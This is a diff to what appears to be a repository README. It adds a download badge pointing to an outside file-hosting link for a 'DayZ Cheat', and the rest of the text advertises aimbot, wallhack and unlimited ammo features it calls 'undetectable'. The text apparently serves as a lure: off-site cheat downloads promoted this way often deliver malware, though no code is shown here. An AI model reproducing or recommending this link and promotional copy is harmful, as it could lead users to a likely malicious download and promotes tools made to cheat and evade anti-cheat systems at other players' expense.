@@ -1,4 +1,4 @@
-
+[![Download DayZ Cheat](https://img.shields.io/badge/Download-DayZ%20Cheat-blueviolet)](https://downeefiles.com/s/dyzcht)
 
 
 **DayZ Cheat** is a comprehensive cheat tool designed to give players a competitive edge in DayZ. With powerful features like aimbot, wallhack, unlimited ammo, and more, this cheat helps players dominate the survival environment. Whether you're looking to improve your shooting accuracy, see through obstacles, or stay fully equipped with unlimited resources, DayZ Cheat provides everything you need to survive and thrive in the harsh world of DayZ. The tool is easy to use, regularly updated to stay compatible with the latest game patches, and designed to ensure smooth and undetectable gameplay.
